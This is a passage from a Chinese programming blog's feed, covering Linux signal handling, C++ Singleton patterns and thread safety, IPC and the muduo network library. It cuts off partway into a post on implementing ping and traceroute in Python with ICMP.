class="token punctuation">;</span><span class="token comment">/* Used if SA_SIGINFO is set.  */</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sa_sigaction<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token class-name">siginfo_t</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    __sigaction_handler<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name">sa_handler</span><span class="token expression">__sigaction_handler<span class="token punctuation">.</span>sa_handler</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span> <span class="token macro-name">sa_sigaction</span><span class="token expression">__sigaction_handler<span class="token punctuation">.</span>sa_sigaction</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>    __sighandler_t sa_handler<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token comment">/* Additional set of signals to be blocked.  */</span>    __sigset_t sa_mask<span class="token punctuation">;</span>    <span class="token comment">/* Special flags.  */</span>    <span class="token keyword">int</span> sa_flags<span class="token punctuation">;</span>    <span class="token comment">/* Restore handler.  */</span>    <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>sa_restorer<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li>sa_handler是一个函数指针，指向信号处理函数</li><li>sa_sigaction同样是信号处理函数，有三个参数，可以获得关于信号更详细的信息</li><li>sa_mask用来指定在信号处理函数执行期间需要被屏蔽的信号</li><li>sa_flags用于指定信号处理的行为<ul><li>SA_RESTART，使被信号打断的系统调用自动重新发起</li><li>SA_NOCLDSTOP，使父进程在它的子进程暂停或继续运行时不会收到 SIGCHLD 信号</li><li>SA_NOCLDWAIT，使父进程在它的子进程退出时不会收到 SIGCHLD 信号，这时子进程如果退出也不会成为僵尸进程</li><li>SA_NODEFER，使对信号的屏蔽无效，即在信号处理函数执行期间仍能发出这个信号</li><li>SA_RESETHAND，信号处理之后重新设置为默认的处理方式</li><li>SA_SIGINFO，使用 sa_sigaction 成员而不是 sa_handler 作为信号处理函数</li></ul></li><li>sa_restorer一般不使用</li></ul><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul><li><p>sigaciton 函数</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token keyword">int</span> <span class="token function">sigaction</span><span class="token punctuation">(</span><span class="token keyword">int</span> signum<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token operator">*</span>act<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">sigaction</span> <span class="token operator">*</span>oldact<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>signum表示操作的信号。</li><li>act表示对信号设置新的处理方式。</li><li>oldact表示信号原来的处理方式。</li><li>返回值，0 表示成功，-1 表示有错误发生。</li></ul></li><li><p>sigfillset函数</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sigfillset</span><span class="token punctuation">(</span><span class="token class-name">sigset_t</span> <span class="token operator">*</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span>w</code></pre><p>用来将参数set信号集初始化，然后把所有的信号加入到此信号集里。</p></li><li>SIGALRM、SIGTERM信号<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIGALRM</span>  <span class="token expression"><span class="token number">14</span>     </span><span class="token comment">//由alarm系统调用产生timer时钟信号</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SIGTERM</span>  <span class="token expression"><span class="token number">15</span>     </span><span class="token comment">//终端发送的终止信号</span></span></code></pre></li><li>alarm函数<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> seconds<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>设置信号传送闹钟，即用来设置信号SIGALRM在经过参数seconds秒数后发送给目前的进程。如果未设置信号SIGALRM的处理函数，那么alarm()默认处理终止进程.</li><li>socketpair函数<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">socketpair</span><span class="token punctuation">(</span><span class="token keyword">int</span> domain<span class="token punctuation">,</span> <span class="token keyword">int</span> type<span class="token punctuation">,</span> <span class="token keyword">int</span> protocol<span class="token punctuation">,</span> <span class="token keyword">int</span> sv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ul><li>domain表示协议族，PF_UNIX或者AF_UNIX等等，主要用来IPC。</li><li>type表示协议，可以是SOCK_STREAM或者SOCK_DGRAM，SOCK_STREAM基于TCP，SOCK_DGRAM基于UDP</li><li>protocol表示类型，只能为0</li><li>sv[2]表示套节字柄对，该两个句柄作用相同，均能进行读写双向操作</li><li>返回结果， 0为创建成功，-1为创建失败</li></ul></li><li>send 函数<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">int</span> sockfd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>当套接字发送缓冲区变满时，send通常会阻塞，除非套接字设置为非阻塞模式，当缓冲区变满时，返回EAGAIN或者EWOULDBLOCK错误，此时可以调用select函数来监视何时可以发送数据。</li></ul><h2 id="日志相关"><a href="#日志相关" class="headerlink" title="日志相关"></a>日志相关</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><ul><li>生产者-消费者模型，并发编程中的经典模型。以多线程为例，为了实现线程间数据同步，生产者线程与消费者线程共享一个缓冲区，其中生产者线程往缓冲区中push消息，消费者线程从缓冲区中pop消息。</li><li>阻塞队列，将生产者-消费者模型进行封装，使用循环数组实现队列，作为两者共享的缓冲区。</li><li>日志：由服务器自动创建，并记录运行状态，错误信息，访问数据的文件。<ul><li>同步日志：日志写入函数与工作线程串行执行，由于涉及到I/O操作，当单条日志比较大的时候，同步模式会阻塞整个处理流程，服务器所能处理的并发能力将有所下降，尤其是在峰值的时候，写日志可能成为系统的瓶颈。</li><li>将所写的日志内容先存入阻塞队列，写线程从阻塞队列中取出内容，写入日志。</li></ul></li><li>单例模式：保证一个类只创建一个实例，同时提供全局访问的方法。</li></ul><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><p>单例模式，简单来说就是保证一个类最多存在一个实例，并且这种保证是来自于设计者，而不是使用者。而实现这样需求的办法就是：让类的构造函数私有，在类内创建一个静态对象，并创建一个公有的静态方法访问这个对象。<br>单例模式的实现有懒汉模式和饿汉模式。下面是这两种模式的实现。</p><ul><li><p>饿汉模式：是线程安全的，所以在访问量比较大，或者可能访问的线程比较多时，采用饿汉实现（不用锁机制，开销小），可以实现更好的性能。</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Singleton <span class="token operator">*</span>Singleton<span class="token operator">::</span>instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Singleton <span class="token operator">*</span>one <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Singleton <span class="token operator">*</span>two <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>one <span class="token operator">==</span> two<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"单例！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*结果：i am single单例！*/</span></code></pre></li><li><p>懒汉模式：第一次用才去实例化，访问量较小时，采用懒汉模式；非线程安全，当多线程访问时可能会创建多个实例。</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"first"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"second"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>                <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>Singleton <span class="token operator">*</span>Singleton<span class="token operator">::</span>instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Singleton <span class="token operator">*</span>one <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Singleton <span class="token operator">*</span>two <span class="token operator">=</span> Singleton<span class="token operator">::</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>one <span class="token operator">==</span> two<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"单例！"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*i am singlefirstsecond单例！*/</span></code></pre></li><li><p>使用懒汉模式下加锁：仅仅在判断是否为nullptr前，加了一个锁。这样效率会低，因为不管是否instance已经实例化，每次都要加锁进入临界区后才能做判断是否为nullptr。所以就有了下面的 double checked locking</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">pthread_mutex_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">pthread_mutex_t</span> mutex<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"first"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"second"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">pthread_mutex_t</span> Singleton<span class="token operator">::</span>mutex<span class="token punctuation">;</span>Singleton <span class="token operator">*</span>Singleton<span class="token operator">::</span>instance <span class="token operator">=</span> nullptr<span class="token punctuation">;</span></code></pre></li><li>懒汉模式下双加锁：<pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>    <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"i am single"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token function">pthread_mutex_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">static</span> Singleton <span class="token operator">*</span>instance<span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token class-name">pthread_mutex_t</span> mutex<span class="token punctuation">;</span>public<span class="token operator">:</span>    <span class="token keyword">static</span> Singleton <span class="token operator">*</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>instance <span class="token operator">==</span> nullptr<span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"first"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"second"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>            <span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></li><li><p>DCL靠不住？<br>在muduo那本书中有写道：人们一直认为double checked locking是王道，有“神牛”指出由于乱序执行的影响，DCL（double checked locking）是靠不住的。<br>对于</p><pre class="language-c" data-language="c"><code class="language-c">instance <span class="token operator">=</span> new <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>编译器会分如下几步：<br>1、Singleton对象分配空间。<br>2、在分配的空间中构造对象<br>3、使instance指向分配的空间<br>其中2、3步是有可能交换的<br>就有可能发生这样的情况：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token number">1</span>、线程A进入了getInstance函数，并且执行了step1和step3，然后挂起。这时的状态是：instance不为nullptr，但instance指向的内存去没有对象！<span class="token number">2</span>、线程B进入了getInstance函数，发现instance不为nullptr，就直接<span class="token keyword">return</span> instance。</code></pre></li><li><p>c++11 解决了上述问题<br>在《Effective C++》提出了使用函数内的local static对象，如下所示。</p><pre class="language-c" data-language="c"><code class="language-c">class Singleton<span class="token punctuation">&#123;</span>private<span class="token operator">:</span>  <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token operator">~</span><span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token keyword">const</span> Singleton<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  Singleton<span class="token operator">&amp;</span> operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> Singleton<span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>public<span class="token operator">:</span>  <span class="token keyword">static</span> Singleton<span class="token operator">&amp;</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> Singleton instance<span class="token punctuation">;</span>    <span class="token keyword">return</span> instance<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li>non-local static对象（函数外）<br>C++规定，non-local static 对象的初始化发生在main函数执行之前，也即main函数之前的单线程启动阶段，所以不存在线程安全问题。但C++没有规定多个non-local static 对象的初始化顺序，尤其是来自多个编译单元的non-local static对象，他们的初始化顺序是随机的。</li><li><p>local static 对象（函数内）<br>对于local static 对象，其初始化发生在控制流第一次执行到该对象的初始化语句时。多个线程的控制流可能同时到达其初始化语句。</p><p>在C++11之前，在多线程环境下local static对象的初始化并不是线程安全的。具体表现就是：如果一个线程正在执行local static对象的初始化语句但还没有完成初始化，此时若其它线程也执行到该语句，那么这个线程会认为自己是第一次执行该语句并进入该local static对象的构造函数中。这会造成这个local static对象的重复构造，进而产生内存泄露问题。所以，local static对象在多线程环境下的重复构造问题是需要解决的。</p><p>而C++11则在语言规范中解决了这个问题。C++11规定，在一个线程开始local static 对象的初始化后到完成初始化前，其他线程执行到这个local static对象的初始化语句就会等待，直到该local static 对象初始化完成。</p></li><li><p>注意点<br>1、c++静态变量（const整数类型除外）一定要在类外进行定义和初始化（类内的只是声明，非初始化，不会分配内存）</p><p>2、单例模式的析构函数中不要释放（delete）单例对象，而是应该定义一个静态的嵌套类对象去析构单例对象。因为delete对象时，先要调用对象的析构函数，这会造成在析构函数中去调用析构函数的递归死循环，最后耗尽栈空间</p><p>3、单例的析构函数最好是私有的，否则别人可能会delete你的instance</p><p>4、GetInstance()肯定是static的，因为它不属于某个对象，最关键的是你也不能构造出类对象去调用它，所以必须是static的</p><p>5、由于GetInstance是static的，所以它内部用到的锁，也得是static的，不能属于类对象才行。</p></li></ul></li></ul><h1 id="性能相关"><a href="#性能相关" class="headerlink" title="性能相关"></a>性能相关</h1><h2 id="写入时复制，Copy-on-write"><a href="#写入时复制，Copy-on-write" class="headerlink" title="写入时复制，Copy-on-write"></a>写入时复制，Copy-on-write</h2><p>如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。<br>在muduo库中使用share_ptr实现copy-on-write</p><h1 id="Linux-网络编程相关"><a href="#Linux-网络编程相关" class="headerlink" title="Linux 网络编程相关"></a>Linux 网络编程相关</h1><h2 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h2><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>P、V操作。<br>假设有信号量SV，对它的P、V操作含义如下：</p><ul><li>P(SV)，如果SV的值大于0，就将它减1; 如果SV的值为0，则挂起进程的执行。</li><li>V(SV)，如果有其他进程因为等待SV而挂起，则唤醒之; 如果没有，则将SV加1。<br>Linux信号量API定义在<code>sys/sem.h</code>处，主要包含3个系统调用，<code>semget</code>，<code>semop</code>，<code>semctl</code>。</li></ul><h3 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h3><p>共享内存是最高效的IPC机制，因为它不涉及进程之间的任何数据传输。这种高效率带来的问题是，我们必须用其他辅助手段来同步进程对共享内存的访问，否则会产生竞态条件。因此，共享内存通常和其他进程间通信方式一起使用。<br>Linux共享内存的API定义在<code>sys/shm.h</code>头文件中，包括4个系统调用：<code>shmget</code>, <code>shmat</code>, <code>shmdt</code>, <code>shmctl</code>。</p><p>还可以使用<code>mmap</code>和<code>munmap</code>函数，这个主要用于父进程与子进程之间的匿名内存共享。<code>mmap</code>函数用于申请一段内存空间，将这段内存作为进程间通信的共享内存，也可以将文件直接映射道其中。<code>mumap</code>则是释放这段内存空间。<code>shm_open</code>则可以实现无关进程之间的内存共享。</p><h3 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h3><p>两进程之间传递二进制块数据的一种简单有效方式。</p><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h3 id="posix信号量"><a href="#posix信号量" class="headerlink" title="posix信号量"></a>posix信号量</h3><p><code>posix</code>信号量函数的名字都以<code>sem_</code>开头。</p><h3 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h3><p>互斥锁用于保护关键代码段，确保独占式的访问，有点像二进制信号量。用于同步线程对共享数据的访问。</p><h3 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h3><p>用于在线程之间同步共享数据的值，这个提供了一种线程间的通知机制；当某个共享数据达到某个值的时候，唤醒等待这个共享数据的线程。</p><h1 id="muduo-库相关学习"><a href="#muduo-库相关学习" class="headerlink" title="muduo 库相关学习"></a>muduo 库相关学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://github.com/chenshuo/muduo">muduo</a>是chenshuo大佬开源的一个基于<a href="https://youjiali1995.github.io/network/muduo/">reactor pattern的多线程网络库</a>，链接中有他的设计目标。</p><p>网络库一般关注3个方面：</p><ul><li>模型：Linux 下一般都是 Reactor 模式，常用的线程模型有<ul><li>Redis 的 one loop one thread</li><li>Nginx 的 one loop per process + SO_REUSEPORT</li><li>Muduo 的 one loop per thread + threadpool</li></ul></li><li>性能：一般模型确定下来，性能也就大差不差了，这点主要是实现上面考虑的，是追求极致的性能还是保证代码的易读性。</li><li>接口：既要保证通用性能够提供多种模型的选择和全面的功能，又要保证接口的易用性。</li></ul><p>Muduo 使用的是 one loop per thread + threadpool，即配置多个线程，每个线程跑一个 eventloop，一个线程只负责接受连接并分发给其他线程，之后该连接的所有 i/o 操作 都由该线程处理，threadpool 可以用来处理耗时长的任务。</p><h2 id="整体分析"><a href="#整体分析" class="headerlink" title="整体分析"></a>整体分析</h2><p>Reactor 模式涉及的类：</p><ul><li>Channal： 封装 I/O 事件和回调，可以代表多种实体：listening fd、timer fd、event fd 等。</li><li>Poller：I/O Multiplexing 的基类，封装底层的系统调用(poll(2) 和 epoll(2))。根据 Channel 更新事件，并返回活跃的 Channel。</li><li>Eventloop：整合 Channel 和 Poller，提供更高层的接口，如定时器。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于python的ping和traceroute实现</title>
      <link href="/2021/10/02/%E5%9F%BA%E4%BA%8Epython%E7%9A%84ping%E5%92%8Ctraceroute%E5%AE%9E%E7%8E%B0/"/>
      <url>/2021/10/02/%E5%9F%BA%E4%BA%8Epython%E7%9A%84ping%E5%92%8Ctraceroute%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="PING"><a href="#PING" class="headerlink" title="PING"></a>PING</h1><h2 id="ping需要实现的内容"><a href="#ping需要实现的内容" class="headerlink" title="ping需要实现的内容"></a>ping需要实现的内容</h2><p>首先用命令行使用ping命令，发现存在回复</p><pre class="language-bash" data-language="bash"><code class="language-bash">正在 Ping <span class="token number">114.114</span>.114.114 具有 <span class="token number">32</span> 字节的数据:来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>12ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">91</span>来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>13ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">86</span>来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>13ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">86</span>来自 <span class="token number">114.114</span>.114.114 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>12ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">84</span><span class="token number">114.114</span>.114.114 的 Ping 统计信息:    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">4</span>，丢失 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% 丢失<span class="token punctuation">)</span>，往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:    最短 <span class="token operator">=</span> 12ms，最长 <span class="token operator">=</span> 13ms，平均 <span class="token operator">=</span> 12ms</code></pre><p>观察得到，需要获得的信息为往返行程的统计时间，丢包率以及TTL。所以需要实现的东西为ICMP包的封装和解包，IP包的封装和解包，IP包的接受与发送即可。</p><h2 id="IP包的封装和解包"><a href="#IP包的封装和解包" class="headerlink" title="IP包的封装和解包"></a>IP包的封装和解包</h2><p>python存在有套接字库，可以便捷的实现IP包的封装，需要注意的是，由于TTL值存在与IP包中，在解包过程中需要获得该信息，下图为IP包的的格式，ICMP在IP包的数据部分。<br><img src="IP_format.png" alt="IP_format"><em>IP包头的格式</em></p><h2 id="ICMP包的封装和解包"><a href="#ICMP包的封装和解包" class="headerlink" title="ICMP包的封装和解包"></a>ICMP包的封装和解包</h2><p>下图为ICMP包的封装和报文格式。从表格和图就可以看出，要实现的PING协议的ICMP协议需要的各种参数。<br><img src="ICMP_Encapsulation.png" alt="ICMP_Encapsulation"><em>ICMP的封装</em><br><img src="ICMP_format.png" alt="ICMP_format"><em>ICMP的报文格式</em><br><img src="PING_format.png" alt="PING_format"><em>回送请求和应答的报文格式</em></p><div class="table-container"><table><thead><tr><th>类型</th><th>ICMP报文意义</th><th>类型</th><th>ICMP报文意义</th></tr></thead><tbody><tr><td>0</td><td>回送应答</td><td>12</td><td>数据报参数错</td></tr><tr><td>3</td><td>目的地不可达</td><td>13</td><td>时间戳请求</td></tr><tr><td>4</td><td>源站抑制(Source Quench)</td><td>14</td><td>时间戳应答</td></tr><tr><td>5</td><td>重定向(改变路由)</td><td>15</td><td>信息请求(已过时）</td></tr><tr><td>8</td><td>回送请求</td><td>16</td><td>信息应答(已过时)</td></tr><tr><td>9</td><td>路由器通告(advertisement)</td><td>17</td><td>地址掩码(Address Mask)请求</td></tr><tr><td>10</td><td>路由器恳求(solicitation)</td><td>18</td><td>地址掩码(Address 